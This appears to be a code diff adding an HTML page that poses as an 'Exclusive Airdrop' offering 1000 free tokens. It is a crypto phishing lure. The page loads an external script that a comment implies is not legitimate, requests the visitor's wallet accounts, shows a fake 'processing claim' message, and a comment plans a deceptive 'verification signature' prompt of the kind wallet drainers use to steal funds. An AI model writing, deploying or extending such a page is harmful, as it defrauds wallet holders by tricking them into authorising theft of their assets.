@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exclusive Airdrop - Claim Your Tokens</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3-connect-helper@latest/dist/index.js"></script>
+    <!-- Other legitimate libraries -->
+</head>
+<body>
+    <h1>Connect your wallet to claim 1000 FREE tokens!</h1>
+    <button onclick="connectWallet()">Connect Wallet</button>
+    <script>
+        async function connectWallet() {
+            if (window.ethereum) {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                alert("Wallet connected! Processing claim... (This may take a moment)");
+                // Fake loading, then prompt for a "verification signature"
+            } else {
+                alert("Please install MetaMask!");
+            }
+        }
+    </script>
+</body>
+</html>
